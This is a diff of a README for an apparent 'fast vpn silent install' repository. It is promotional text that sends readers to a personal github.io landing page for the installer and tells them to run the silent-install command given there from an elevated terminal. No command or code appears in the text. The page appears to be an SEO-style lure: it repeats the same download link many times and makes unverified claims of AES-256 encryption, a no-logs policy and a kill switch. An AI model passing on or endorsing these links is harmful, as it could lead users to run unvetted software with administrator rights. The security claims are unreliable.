@@ -1,91 +1,91 @@
 # ⚡ fast vpn silent install
 
-[![Download](https://img.shields.io/badge/Download-Get%20Installer-blue?style=for-the-badge)](https://mandid22.github.io/fast-vpn-silent-install-landing/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-2ea44f?style=for-the-badge)](https://mandid22.github.io/fast-vpn-silent-install-landing/)
+[![Download](https://img.shields.io/badge/Download-Get%20Installer-2ea44f?style=for-the-badge)](https://mandid22.github.io/fast-vpn-silent-install-landing/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-5865f2?style=for-the-badge)](https://mandid22.github.io/fast-vpn-silent-install-landing/)
 [![License](https://img.shields.io/badge/License-MIT-black?style=for-the-badge)](https://mandid22.github.io/fast-vpn-silent-install-landing/)
 
 ## About
 
-**fast vpn silent install** is a clean, repeatable way to install **fast vpn** without prompts. It’s built for admins and power users who want unattended setup on Windows, macOS, and Linux—fast, predictable, and easy to script.
+**fast vpn silent install** is a clean, unattended install flow for *fast vpn* that you can run in scripts, RMM jobs, or on fresh machines without babysitting prompts. It’s built for quick rollouts and consistent installs—same switches, same outcome.
 
-This repository documents the install flow and points to the installer landing page. Repo reference:  
-<https://github.com/mandid22/fast-vpn-silent-install-seo>
+Project repo: https://github.com/mandid22/fast-vpn-silent-install-seo  
+Landing page (all downloads): https://mandid22.github.io/fast-vpn-silent-install-landing/
 
 ## Features
 
-- **Silent / unattended install** for quick rollouts
+- **Silent install**: unattended setup designed for automation
+- **High speed** with a **stable connection**
 - **AES-256 encryption** for traffic protection
-- **No-Logs policy** and a clear privacy and security focus
-- **Kill Switch** support to prevent leaks on drop
-- **Global Servers** with **high speed** and **stable connection**
-- Script-friendly: works well with CI images and device provisioning
+- **No-Logs policy** focus
+- **Kill Switch** support to avoid leaks on drop
+- **Global Servers** coverage for flexible routing
+- Minimal steps, predictable behavior, easy to repeat
 
 ## System Requirements
 
-| Item | Requirement |
+| Requirement | Minimum |
 |---|---|
-| Windows | Windows 10/11 (64-bit) |
-| macOS | macOS 11+ |
-| Linux | Ubuntu/Debian/Fedora (64-bit) |
-| RAM | 2 GB minimum (4 GB recommended) |
+| Windows | Windows 10/11 (x64) |
+| macOS | macOS 12+ |
+| Linux | Ubuntu 20.04+ / comparable distro |
+| RAM | 2 GB (4 GB recommended) |
 | Storage | 200 MB free |
-| Internet | Required for sign-in and server list updates |
+| Internet | Broadband connection required |
 
 ## Installation
 
-All install packages and the current silent parameters are published on the landing page:
-
-- **Installer & commands:** <https://mandid22.github.io/fast-vpn-silent-install-landing/>
+> Use the official landing page link for the current installer package and silent flags.
 
 ### Windows
 
-1. Download the Windows installer from the landing page.  
-2. Run the silent install command shown on the landing page (works in **CMD** and **PowerShell**).
-3. Launch fast vpn and sign in (or deploy credentials via your standard management process).
+1. Download the installer from: https://mandid22.github.io/fast-vpn-silent-install-landing/
+2. Run a silent install from an elevated terminal:
+   - Use the command shown on the landing page for the current build (flags can differ by package type).
+3. Launch *fast vpn* and sign in.
 
 ### macOS
 
-1. Download the macOS package from the landing page.  
-2. Run the provided terminal command (uses standard macOS installer tooling).
-3. Grant the VPN permissions when macOS prompts on first launch (this part is OS-controlled).
+1. Download the macOS package from: https://mandid22.github.io/fast-vpn-silent-install-landing/
+2. Install using the provided terminal command on the landing page (handles package/app format).
+3. Open *fast vpn*, approve permissions if macOS prompts for VPN/network access.
 
 ### Linux
 
-1. Download the Linux package from the landing page.  
-2. Install with the command shown (Deb/RPM supported as listed).
-3. Start the app and connect to a server.
+1. Grab the Linux build from: https://mandid22.github.io/fast-vpn-silent-install-landing/
+2. Install using the distro command listed on the landing page (deb/rpm instructions vary).
+3. Start the app and authenticate.
 
 ## Comparison
 
 | Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
 |---|---:|:---:|:---:|:---:|:---:|
-| fast vpn (silent install) | High | ✅ | ✅ | ✅ | ✅ |
-| Manual install (click-through) | Medium | ✅ | ✅ | ✅ | ✅ |
-| Generic free VPN | Low–Medium | ❓ | ❓ | ❓ | ❓ |
+| **fast vpn** | High | ✅ | ✅ | ✅ | ✅ |
+| Typical free VPN | Low–Medium | ⚠️ | ⚠️ | ❌ | ⚠️ |
+| Manual installs (no silent flags) | Medium | ✅ | ✅ | ✅ | ✅ |
 
 ## FAQ
 
-**Q: What does “silent install” actually do here?**  
-A: It installs fast vpn without interactive dialogs, using standard OS installer flags.
+**Does “silent install” mean no UI at all?**  
+It means the installer runs unattended. The app UI still exists when you launch it.
 
-**Q: Does silent install also auto-connect after install?**  
-A: Install is unattended; connect behavior depends on the app settings and your sign-in flow.
+**Will this work with scripting tools (PowerShell, Bash, RMM)?**  
+Yes. That’s the point—download, run the silent command, move on.
 
-**Q: Is the Kill Switch enabled by default?**  
-A: Defaults vary by build. After install, open settings once and verify Kill Switch status.
+**Do I need admin rights?**  
+Usually yes, especially on Windows and macOS, because VPN drivers/network extensions require elevated privileges.
 
-**Q: Where do I get the exact install command for my platform?**  
-A: From the landing page: <https://mandid22.github.io/fast-vpn-silent-install-landing/>
+**Is the VPN traffic encrypted?**  
+Yes—*fast vpn* uses **AES-256 encryption** and includes a **Kill Switch** option for drop protection.
 
 ## Download
 
-Get the installer and the current silent install commands here:  
+Get the current installer + the exact silent install command here:  
 **https://mandid22.github.io/fast-vpn-silent-install-landing/**
 
 ## Final CTA
 
-[![Get fast vpn silent install](https://img.shields.io/badge/Get-fast%20vpn%20silent%20install-blue?style=for-the-badge)](https://mandid22.github.io/fast-vpn-silent-install-landing/)
-[![Open landing page](https://img.shields.io/badge/Open-Landing%20Page-2ea44f?style=for-the-badge)](https://mandid22.github.io/fast-vpn-silent-install-landing/)
-[![View repository](https://img.shields.io/badge/View-Repository-black?style=for-the-badge)](https://github.com/mandid22/fast-vpn-silent-install-seo)
+[![Install Now](https://img.shields.io/badge/⚡%20Install%20fast%20vpn%20silent%20install-Get%20Started-ff5a1f?style=for-the-badge)](https://mandid22.github.io/fast-vpn-silent-install-landing/)
+[![Open Repo](https://img.shields.io/badge/GitHub-Repository-181717?style=for-the-badge&logo=github)](https://github.com/mandid22/fast-vpn-silent-install-seo)
+[![Download](https://img.shields.io/badge/Download-Landing%20Page-2ea44f?style=for-the-badge)](https://mandid22.github.io/fast-vpn-silent-install-landing/)
 
-*Install fast. Connect fast. Keep it quiet.*
+*If you’re rolling out a VPN across machines, silent install is the difference between “done” and “stuck clicking Next.”*
